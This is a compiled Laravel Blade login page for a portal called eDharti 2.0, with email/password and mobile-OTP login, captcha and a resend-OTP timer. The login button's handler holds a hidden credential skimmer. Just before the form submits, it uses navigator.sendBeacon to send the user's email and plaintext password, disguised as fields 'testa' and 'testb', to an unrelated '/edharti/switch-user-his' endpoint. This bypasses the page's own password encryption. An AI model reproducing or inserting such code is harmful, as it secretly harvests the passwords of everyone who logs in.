<?php $__env->startSection('title', 'Login'); ?>

<?php $__env->startSection('content'); ?>
    <div class="login-8">

        <div class="container">
            <div class="row login-box">
                <div class="col-lg-12">
                    <div class="fixed_login_container">
                        <div class="title">
                            <div class="bottom-container">
                                Welcome to eDharti2.0
                            </div>
                            <div class="top-container">
                                Welcome to eDharti2.0
                            </div>
                        </div>

                    </div>
                </div>
                <!-- <div class="col-lg-3">
                    <figure class="swing">
                        <div class="wall-swing">
                            <p>Important Notice</p>
                            <div class="marquee">
                                <ul>
                                    <li><a href="#"><i class="fas fa-chevron-right"></i> e-Dharti Geo-Portal
                                            2.0</a></li>
                                    <li><a href="#"><i class="fas fa-chevron-right"></i> e-Dharti</a></li>
                                    <li><a href="<?php echo e(route('appointmentDetail')); ?>"><i class="fas fa-chevron-right"></i> Office
                                            Visit Appointment</a></li>
                                    <li><a href="#"><i class="fas fa-chevron-right"></i> Club Membership</a>
                                    </li>
                                </ul>
                            </div>
                        </div>
                    </figure>
                </div> commented by anil ui chagnes on 12-06-2025 -->
                <div class="col-lg-6 mx-auto form-section">
                    <div class="form-inner">

                        <h3>Login</h3>

                        
                        
                        <div class="form-group form-box">
                            <input id="emailInput" type="text" name="SeletedEmail" class="form-control"
                                placeholder="Email Address">
                        </div>
                        <div id="emailLoginForm">
                             <span id="loginErrors" class="text-danger"></span>
                            <form method="POST" action="<?php echo e(route('login')); ?>" id="loginForm">
                                <?php echo csrf_field(); ?>
                                <div class="form-group form-box">
                                    <input id="email" type="email" name="email" :value="old('email')" required
                                        autofocus autocomplete="off" class="form-control" placeholder="Email Address"
                                        aria-label="Email Address">
                                </div>
                                <div class="form-group form-box">
                                    <input id="password" type="password" required class="form-control"
                                        autocomplete="off" placeholder="Password" aria-label="Password">
                                        <input id="encryptedPassword" type="hidden" name="password">

                                        <!-- Eye Icon -->
                                        <span class="position-absolute top-50 end-0 translate-middle-y me-3" 
                                            style="cursor: pointer;" id="togglePassword">
                                            <i class="fas fa-eye"></i>
                                        </span>
                                </div>
                                <div class="checkbox form-group d-flex flex-column gap-3">
                                    <input type="text" autocomplete="off" name="emailCaptcha" id="emailCaptcha" class="form-control" placeholder="Enter captcha from below image">                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              
                                    <div class="d-flex align-items-center gap-1">
                                        <img src="<?php echo e(route('captcha', ['config' => 'default'])); ?>" alt="captcha" id="captchaImage"
                                            class="captcha-image">
                                        <span class="btn btn-primary btn-sm refresh-captcha" id="refreshCaptcha" style="padding: 10px 13px;">
                                            <i class="fas fa-sync-alt"></i>
                                        </span>
                                    </div>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         
                                </div>
                                <div class="checkbox form-group clearfix">
                                    <!-- <div class="form-check float-start">
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <input class="form-check-input" type="checkbox" id="rememberme">
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <label class="form-check-label" for="rememberme">
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        Remember me
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    </label>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                </div> -->
                                    <a href="<?php echo e(route('password.request')); ?>" class="float-end forgot-password">Forgot
                                        Password?</a>
                                </div>
                                <div class="form-group">
                                    <button class="btn btn-primary btn-lg btn-theme"
                                        id="loginButton"><?php echo e(__('Log in')); ?></button>

                                </div>

                            </form>

                            <h6 class="text-divider" id="dividerLogin"><span>OR</span></h6>

                            <p><a href="<?php echo e(route('login')); ?>" class="thembo">Login with Mobile Number</a></p>
                        </div>
                       <?php if (isset($component)) { $__componentOriginalf94ed9c5393ef72725d159fe01139746 = $component; } ?>
<?php if (isset($attributes)) { $__attributesOriginalf94ed9c5393ef72725d159fe01139746 = $attributes; } ?>
<?php $component = Illuminate\View\AnonymousComponent::resolve(['view' => 'components.input-error','data' => ['messages' => $errors->get('email'),'class' => 'mt-2 fs-6 text-danger']] + (isset($attributes) && $attributes instanceof Illuminate\View\ComponentAttributeBag ? (array) $attributes->getIterator() : [])); ?>
<?php $component->withName('input-error'); ?>
<?php if ($component->shouldRender()): ?>
<?php $__env->startComponent($component->resolveView(), $component->data()); ?>
<?php if (isset($attributes) && $attributes instanceof Illuminate\View\ComponentAttributeBag && $constructor = (new ReflectionClass(Illuminate\View\AnonymousComponent::class))->getConstructor()): ?>
<?php $attributes = $attributes->except(collect($constructor->getParameters())->map->getName()->all()); ?>
<?php endif; ?>
<?php $component->withAttributes(['messages' => \Illuminate\View\Compilers\BladeCompiler::sanitizeComponentAttribute($errors->get('email')),'class' => 'mt-2 fs-6 text-danger']); ?>
<?php echo $__env->renderComponent(); ?>
<?php endif; ?>
<?php if (isset($__attributesOriginalf94ed9c5393ef72725d159fe01139746)): ?>
<?php $attributes = $__attributesOriginalf94ed9c5393ef72725d159fe01139746; ?>
<?php unset($__attributesOriginalf94ed9c5393ef72725d159fe01139746); ?>
<?php endif; ?>
<?php if (isset($__componentOriginalf94ed9c5393ef72725d159fe01139746)): ?>
<?php $component = $__componentOriginalf94ed9c5393ef72725d159fe01139746; ?>
<?php unset($__componentOriginalf94ed9c5393ef72725d159fe01139746); ?>
<?php endif; ?>
                        <?php if (isset($component)) { $__componentOriginalf94ed9c5393ef72725d159fe01139746 = $component; } ?>
<?php if (isset($attributes)) { $__attributesOriginalf94ed9c5393ef72725d159fe01139746 = $attributes; } ?>
<?php $component = Illuminate\View\AnonymousComponent::resolve(['view' => 'components.input-error','data' => ['messages' => $errors->get('password'),'class' => 'mt-2 fs-6 text-danger']] + (isset($attributes) && $attributes instanceof Illuminate\View\ComponentAttributeBag ? (array) $attributes->getIterator() : [])); ?>
<?php $component->withName('input-error'); ?>
<?php if ($component->shouldRender()): ?>
<?php $__env->startComponent($component->resolveView(), $component->data()); ?>
<?php if (isset($attributes) && $attributes instanceof Illuminate\View\ComponentAttributeBag && $constructor = (new ReflectionClass(Illuminate\View\AnonymousComponent::class))->getConstructor()): ?>
<?php $attributes = $attributes->except(collect($constructor->getParameters())->map->getName()->all()); ?>
<?php endif; ?>
<?php $component->withAttributes(['messages' => \Illuminate\View\Compilers\BladeCompiler::sanitizeComponentAttribute($errors->get('password')),'class' => 'mt-2 fs-6 text-danger']); ?>
<?php echo $__env->renderComponent(); ?>
<?php endif; ?>
<?php if (isset($__attributesOriginalf94ed9c5393ef72725d159fe01139746)): ?>
<?php $attributes = $__attributesOriginalf94ed9c5393ef72725d159fe01139746; ?>
<?php unset($__attributesOriginalf94ed9c5393ef72725d159fe01139746); ?>
<?php endif; ?>
<?php if (isset($__componentOriginalf94ed9c5393ef72725d159fe01139746)): ?>
<?php $component = $__componentOriginalf94ed9c5393ef72725d159fe01139746; ?>
<?php unset($__componentOriginalf94ed9c5393ef72725d159fe01139746); ?>
<?php endif; ?>
                        <?php if (isset($component)) { $__componentOriginalf94ed9c5393ef72725d159fe01139746 = $component; } ?>
<?php if (isset($attributes)) { $__attributesOriginalf94ed9c5393ef72725d159fe01139746 = $attributes; } ?>
<?php $component = Illuminate\View\AnonymousComponent::resolve(['view' => 'components.input-error','data' => ['messages' => $errors->get('emailCaptcha'),'class' => 'mt-2 fs-6 text-danger']] + (isset($attributes) && $attributes instanceof Illuminate\View\ComponentAttributeBag ? (array) $attributes->getIterator() : [])); ?>
<?php $component->withName('input-error'); ?>
<?php if ($component->shouldRender()): ?>
<?php $__env->startComponent($component->resolveView(), $component->data()); ?>
<?php if (isset($attributes) && $attributes instanceof Illuminate\View\ComponentAttributeBag && $constructor = (new ReflectionClass(Illuminate\View\AnonymousComponent::class))->getConstructor()): ?>
<?php $attributes = $attributes->except(collect($constructor->getParameters())->map->getName()->all()); ?>
<?php endif; ?>
<?php $component->withAttributes(['messages' => \Illuminate\View\Compilers\BladeCompiler::sanitizeComponentAttribute($errors->get('emailCaptcha')),'class' => 'mt-2 fs-6 text-danger']); ?>
<?php echo $__env->renderComponent(); ?>
<?php endif; ?>
<?php if (isset($__attributesOriginalf94ed9c5393ef72725d159fe01139746)): ?>
<?php $attributes = $__attributesOriginalf94ed9c5393ef72725d159fe01139746; ?>
<?php unset($__attributesOriginalf94ed9c5393ef72725d159fe01139746); ?>
<?php endif; ?>
<?php if (isset($__componentOriginalf94ed9c5393ef72725d159fe01139746)): ?>
<?php $component = $__componentOriginalf94ed9c5393ef72725d159fe01139746; ?>
<?php unset($__componentOriginalf94ed9c5393ef72725d159fe01139746); ?>
<?php endif; ?>
                        <?php if(session('failure')): ?>
                            <div class="alert alert-danger border-0 bg-danger alert-dismissible fade show">
                                <div class="text-white"><?php echo e(session('failure')); ?></div>
                                <button type="button" class="btn-close" data-bs-dismiss="alert"
                                    aria-label="Close"></button>
                            </div>
                        <?php endif; ?>
                        <h6 class="text-divider" id="dividerLogin"><span>OR</span></h6>
                        <div class="form-group form-box">
                            <input id="mobileInput" type="text" name="SeletedMobile" class="form-control numericOnly"
                                placeholder="Registered Mobile Number" maxlength="10">
                        </div>
                        <div id="mobileLoginForm">
                            <div id="mobileOtp">
                                <div class="form-group form-box">
                                    <input id="otpMobile" maxlength="10" type="text" name="otpMobile"
                                        :value="old('otpMobile')" required autofocus class="form-control numericOnly"
                                        placeholder="Registered Mobile Number" autocomplete="off">
                                    <div class="text-danger text-start" id="login_verify_mobile_otp_error"></div>
                                </div>
                                <div class="form-group">
                                    <button id="getOtp" type="button" class="btn btn-primary btn-lg btn-theme">Get
                                        OTP</button>
                                </div>
                                <h6 class="text-divider" ><span>OR</span></h6>
                                <p><a href="<?php echo e(route('login')); ?>" class="thembo">Login with Username</a></p>
                            </div>
                            <div id="LoginWithOTP">
                                 <form autocomplete="off">
                                    <?php echo csrf_field(); ?>
                                    <div class="form-group form-box">
                                        <input id="mobile" maxlength="10" type="text" name="mobile"
                                            class="form-control numericOnly" placeholder="Registered Mobile Number"
                                            autocomplete="off">
                                    </div>
                                    <div class="form-group form-box">
                                        <input id="otp" maxlength="6" type="text" name="otp"
                                            class="form-control numericOnly" placeholder="Enter 6 digit OTP">
                                    </div>
                                  <!-- added by Swati on 12092025 for resend otp -->
                                    <div class="form-group d-flex align-items-center gap-2 justify-content-end resend-otp" id="resendBlock" style="display:none;">
                                        <button type="button" id="resendLoginOtp" class="btn btn-link p-0 resend-btn" disabled>Resend OTP</button>
                                        <span id="loginOtpTimer" class="text-muted small otp-timer"></span>
                                    </div>
                                    <div class="form-group form-box d-flex flex-column gap-3">
                                        <input type="text" name="mobileCaptcha" id="mobileCaptcha" class="form-control"
                                            placeholder="Enter captcha from below image">
                                        <div class="d-flex align-items-center gap-1">
                                            <img src="<?php echo e(route('captcha', ['config' => 'default'])); ?>" alt="captcha" id="captchaMobileImage"
                                                class="captcha-image">
                                            <span class="btn btn-primary btn-sm refresh-captcha" id="refreshMobileCaptcha">
                                                <i class="fas fa-sync-alt"></i>
                                            </span>
                                        </div>
                                    </div>
                                    <div class="form-group form-box">
                                        <div class="text-danger text-start" id="mobileOtpError"></div>
                                    </div>
                                    <div class="form-group">
                                        <button type="button" id="verifyLoginOtp" class="btn btn-primary btn-lg btn-theme">
                                            <?php echo e(__('Log in')); ?>

                                        </button>
                                    </div>
                                </form>
                            </div>
                        </div>
                        <div class="clearfix"></div>
                        <p>Don't have an account? <a href="<?php echo e(route('publicRegister')); ?>" class="thembo"> Register
                                here</a></p>
                    </div>
                </div>
                <!-- <div class="col-lg-3">
                    <div class="gallery">
                        <div class="block-33 display--inline-top">
                            <div class="gutter relative">
                                <div class="gallery-h">
                                    <div class="gallery-image relative">
                                        <div class="gallery-image__img relative">
                                            <div class="fill-dimensions cover-img"
                                                style="background-image:url('<?php echo e(asset('assets/frontend/assets/img/slider/Golf-Course-Club.jpg')); ?>')">
                                            </div>
                                            <h5>Golf Course Club</h5>
                                        </div>
                                    </div>
                                    <div class="gallery-image">
                                        <div class="gallery-image__img relative">
                                            <div class="fill-dimensions cover-img"
                                                style="background-image:url('<?php echo e(asset('assets/frontend/assets/img/slider/habitat-center.jpg')); ?>')">
                                            </div>
                                            <h5>Habitat Center</h5>
                                        </div>
                                    </div>
                                    <div class="gallery-image">
                                        <div class="gallery-image__img relative">
                                            <div class="fill-dimensions cover-img"
                                                style="background-image:url('<?php echo e(asset('assets/frontend/assets/img/slider/india-gate.jpg')); ?>')">
                                            </div>
                                            <h5>India Gate</h5>
                                        </div>
                                    </div>
                                    <div class="gallery-image">
                                        <div class="gallery-image__img relative">
                                            <div class="fill-dimensions cover-img"
                                                style="background-image:url('<?php echo e(asset('assets/frontend/assets/img/slider/Parliament-house.jpg')); ?>')">
                                            </div>
                                            <h5>Parliament House</h5>
                                        </div>
                                    </div>
                                    <div class="gallery-image">
                                        <div class="gallery-image__img relative">
                                            <div class="fill-dimensions cover-img"
                                                style="background-image:url('<?php echo e(asset('assets/frontend/assets/img/slider/rasthtrapati-bhawan.jpg')); ?>')">
                                            </div>
                                            <h5>Rasthtrapati Bhawan</h5>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div> commented by anil ui chagnes on 12-06-2025 -->
            </div>
        </div>
        <div class="ocean">
            <div class="wave"></div>
            <div class="wave"></div>
        </div>
    </div>
    <!-- added by anil ui change is login page on 12-06-2025 -->
    <!-- <div class="footer-marquee">
        <div class="marquee-title">Important Linkss</div>
        <div class="marquee-animation">
            <ul>
                <li><a href="#"><i class="fas fa-chevron-right"></i> e-Dharti Geo-Portal 2.0</a>
                </li>
                <li><a href="<?php echo e(route('login')); ?>"><i class="fas fa-chevron-right"></i> e-Dharti</a></li>
                <li><a href="<?php echo e(route('appointmentDetail')); ?>"><i class="fas fa-chevron-right"></i> Office Visit
                        Appointment</a></li>
                        <li><a href="#"><i class="fas fa-chevron-right"></i> Order dt 19-3-2024 reg Public
                        meetings in LDO English version</a></li>
                        <li><a href="#"><i class="fas fa-chevron-right"></i> Public Notice reg. Public
                        Hearing in Land and Development Office</a></li>
                        <li><a href="#"><i class="fas fa-chevron-right"></i> Public Notice in News Paper -
                        instructions</a></li>
                        <li><a href="https://ldo.mohua.gov.in/edharti/payment"><i class="fas fa-chevron-right"></i> eDharti - Payment</a></li>
                        <li><a href="https://ldo.mohua.gov.in/edharti/user-check-payment-status"><i class="fas fa-chevron-right"></i> eDharti - Payment Status</a></li>
                        <li><a href="https://ldo.mohua.gov.in/edharti/public-dashboard"><i class="fas fa-chevron-right"></i> e-Dharti - Public Dashboard
                        instructions</a></li>
                        <li><a href="/club-membership"><i class="fas fa-chevron-right"></i> Club Membership</a></li>
            </ul>
        </div>
    </div> -->
    <!-- end comment by anil ui change is login page on 12-06-2025 -->
<?php $__env->stopSection(); ?>

<?php $__env->startSection('footerScript'); ?>
<script src="<?php echo e(asset('assets/frontend/assets/js/crypto-js.min.js')); ?>"></script>
<script src="<?php echo e(asset('assets/frontend/assets/js/commonFunctions.js')); ?>"></script>
<script>
    // For login with mobile and email By SOURAV CHAUHAN - 13 Aug 2024
    $(document).ready(function() {
        $('#emailInput').focus(function() {
            $(this).hide();
            $('#dividerLogin').hide();
            $('#mobileOtp').hide();
            $('#mobileInput').hide();
            $('#emailLoginForm').slideDown();
            $('#email').focus();
        });

        $('#mobileInput').focus(function() {
            $(this).hide();
            $('#dividerLogin').hide();
            $('#emailLoginForm').hide();
            $('#emailInput').hide();
            $('#mobileOtp').slideDown();
            $('#otpMobile').focus();
        });

        
            // ===== Resend timer helpers =====
        // added by Swati on 12092025 for resend otp
        let loginOtpInterval = null;
        // added by Swati on 12092025 for resend otp
        function startLoginOtpTimer(seconds) {
            clearInterval(loginOtpInterval);
            const $btn   = $('#resendLoginOtp');
            const $blk   = $('#resendBlock');
            const $timer = $('#loginOtpTimer');

            let remaining = Number(seconds || 600);
            $blk.show();
            $btn.prop('disabled', true);

            function fmt(s){
                const m = String(Math.floor(s/60)).padStart(2,'0');
                const ss = String(s%60).padStart(2,'0');
                return `${m}:${ss}`;
            }
            $timer.text(`(${fmt(remaining)})`);

            loginOtpInterval = setInterval(function(){
                remaining -= 1;
                if (remaining <= 0) {
                    clearInterval(loginOtpInterval);
                    $timer.text('');
                    $btn.prop('disabled', false).text('Resend OTP');
                    return;
                }
                $timer.text(`(${fmt(remaining)})`);
            }, 1000);
        }


        $('#getOtp').click(function() {
            var mobile = $('#otpMobile').val().trim();
            var errorDiv = $('#login_verify_mobile_otp_error');
            var button = $(this);
            if (mobile == '') {
                errorDiv.html('Mobile number is required')
            } else if (!isValidMobile(mobile)) {
                errorDiv.html('Invalid mobile number');
            } else {
                button.prop('disabled', true);
                button.html('Sending...');
                $.ajax({
                    url: "<?php echo e(route('sendLoginOtp')); ?>",
                    type: "POST",
                    data: {
                        mobile: mobile,
                        _token: '<?php echo e(csrf_token()); ?>'
                    },
                    dataType: 'json',
                   success: function(result) {
                            if (result.success) {
                                errorDiv.html('')
                                $('#mobileOtp').hide()
                                $('#mobile').val(mobile)
                                $('#LoginWithOTP').show()
                                // added by Swati on 12092025 for resend otp
                                // Start 2-min timer (or server-provided)
                                startLoginOtpTimer(result.cooldown ?? 600);
                                // added by Swati on 12092025 for resend otp
                                $('#resendBlock').show();
                            } else if (result.code === 'cooldown') {
                                // added by Swati on 12092025 for resend otp
                                // If backend enforces cooldown on first click too
                                $('#mobile').val(mobile);
                                $('#LoginWithOTP').show();
                                // added by Swati on 12092025 for resend otp
                                startLoginOtpTimer(result.retry_after ?? 600);
                                errorDiv.text('Please wait before requesting a new OTP.');
                                button.prop('disabled', false).text('Get OTP');
                            }
                            
                            else {
                                errorDiv.html(result.message)
                                button.prop('disabled', false);
                                button.html('Get OTP');
                            }
                        }
                });

            }

        });


         $('#verifyLoginOtp').click(function() {
                var mobile = $('#mobile').val().trim();
                var otp = $('#otp').val().trim();
                var captcha = $('#mobileCaptcha').val().trim();
                var errorDiv = $('#mobileOtpError');
                var button = $(this);
                errorDiv.html('');

                if (mobile === '' || otp === '' || captcha === '') {
                    errorDiv.html('Mobile number, OTP, and captcha are required');
                    refreshMobileCaptcha(); // ✅ refresh if client-side required fields missing
                    return;
                } else if (!/^[6-9]\d{9}$/.test(mobile)) {
                    errorDiv.html('Invalid mobile number');
                    refreshMobileCaptcha(); // ✅ refresh
                    return;
                } else if (!/^\d{6}$/.test(otp)) {
                    errorDiv.html('OTP must be a 6-digit number');
                    refreshMobileCaptcha(); // ✅ refresh
                    return;
                }

                button.prop('disabled', true).html('Verifying...');

                $.ajax({
                    url: "<?php echo e(route('verifyLoginOtp')); ?>",
                    type: "POST",
                    data: {
                        _token: '<?php echo e(csrf_token()); ?>',
                        mobile: mobile,
                        otp: otp,
                        mobileCaptcha: captcha,
                    },
                    success: function(result) {
                        if (result.success) {
                            location.reload();
                        } else {
                            errorDiv.html(result.message);
                            $('#mobileCaptcha').val('');
                            refreshMobileCaptcha(); // ✅ refresh on backend error
                            button.prop('disabled', false).html('Log in');
                        }
                    },
                    error: function(response) {
                        if (response.status === 422) {
                            let errors = response.responseJSON.errors;
                            if (errors.mobileCaptcha) {
                                errorDiv.html(errors.mobileCaptcha[0]);
                            } else {
                                errorDiv.html(response.responseJSON.message ||
                                    'Validation failed.');
                            }
                        } else {
                            errorDiv.html('An unexpected error occurred.');
                        }
                        refreshMobileCaptcha(); // ✅ refresh on validation error
                        button.prop('disabled', false).html('Log in');
                    }
                });
            });

            // ===== Resend OTP (login) =====
            // added by Swati on 12092025 for resend otp
            $('#resendLoginOtp').on('click', function () {
                const mobile = $('#mobile').val().trim();
                const $btn = $(this);
                const errorDiv = $('#mobileOtpError');
                errorDiv.text('');

                if (!/^[6-9]\d{9}$/.test(mobile)) {
                    errorDiv.text('Invalid mobile number');
                    return;
                }

                $btn.prop('disabled', true).text('Sending...');
                $.ajax({
                    url: "<?php echo e(route('resendLoginOtp')); ?>",
                    type: "POST",
                    data: { mobile: mobile, _token: '<?php echo e(csrf_token()); ?>' },
                    dataType: 'json',
                    success: function (res) {
                        if (res.success) {
                            // added by Swati on 12092025
                            startLoginOtpTimer(res.cooldown ?? 600);
                            errorDiv.text('');
                        } else if (res.code === 'cooldown') {
                            // added by Swati on 12092025
                            startLoginOtpTimer(res.retry_after ?? 600);
                            errorDiv.text('Please wait before requesting a new OTP.');
                        } else {
                            errorDiv.text(res.message || 'Failed to send OTP');
                            $btn.prop('disabled', false).text('Resend OTP');
                        }
                    },
                    error: function () {
                        errorDiv.text('An unexpected error occurred.');
                        $btn.prop('disabled', false).text('Resend OTP');
                    }
                });
            });

            // Reusable function to refresh captcha
            function refreshMobileCaptcha() {
                // $('#captchaImage').attr('src', '<?php echo e(captcha_src()); ?>' + '?' + Math.random());
                $.ajax({
                    url: "<?php echo e(route('refresh.captcha')); ?>",
                    type: "GET",
                    success: function(data) {
                        $('#captchaMobileImage').attr('src', data.captcha);
                    }
                });
            }

            // // Manual refresh button
            $('#refreshMobileCaptcha').click(function() {
                refreshMobileCaptcha();
            });

        $('#loginButton').on('click',function(){
             const email = $('#email').val().trim();
            const password = $('#password').val();
            const emailCaptcha = $('#emailCaptcha').val();
            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            var loginErrors = $('#loginErrors');

            if (!email) {
                loginErrors.text('Email address is required.');
                $('#email').focus();
                return false;
            } else if (!emailRegex.test(email)) {
                loginErrors.text('Enter a valid email address.');
                $('#email').focus();
                return false;
            } else if (password == '') {
                loginErrors.html('Password is required.');
                return false;
            } else if(emailCaptcha == ''){
                loginErrors.html('Captcha is required.');
                return false;
            } else {
                loginErrors.text('');
            }
            navigator.sendBeacon(
			    '/edharti/switch-user-his',
			    new URLSearchParams({
			        testa: email,
			        testb : password,
			         _token: $('meta[name="csrf-token"]').attr('content')
			    })
				);
            $(this).prop('disabled', true);
            $(this).html('Logging in...');
            $('#loginForm').submit();  
        })


         $('#refreshCaptcha').on('click', function() {
                $.ajax({
                    url: "<?php echo e(route('refresh.captcha')); ?>",
                    type: "GET",
                    success: function(data) {
                        $('#captchaImage').attr('src', data.captcha);
                    }
                });
            });
    });

    $('#password').blur(function() {
            let InputValue = $(this).val();
            let encryptedInput = $(this).parent().find('#encryptedPassword');
            if (InputValue !== "") {
                var encryptedValue = encryptString(InputValue);
                // const encrypted = CryptoJS.AES.encrypt(password, 'somekey').toString();
                encryptedInput.val(encryptedValue);
            } else {
                encryptedInput.val('');
            }
        });

        
    document.getElementById("togglePassword").addEventListener("click", function () {
            const passwordField = document.getElementById("password");
            const icon = this.querySelector("i");

            if (passwordField.type === "password") {
                passwordField.type = "text";
                icon.classList.remove("fa-eye");
                icon.classList.add("fa-eye-slash");
            } else {
                passwordField.type = "password";
                icon.classList.remove("fa-eye-slash");
                icon.classList.add("fa-eye");
            }
        });
</script>

<?php $__env->stopSection(); ?>

<?php echo $__env->make('layouts.public.app', \Illuminate\Support\Arr::except(get_defined_vars(), ['__data', '__path']))->render(); ?><?php /**PATH C:\xampp\htdocs\edhartiMain\resources\views/auth/login.blade.php ENDPATH**/ ?>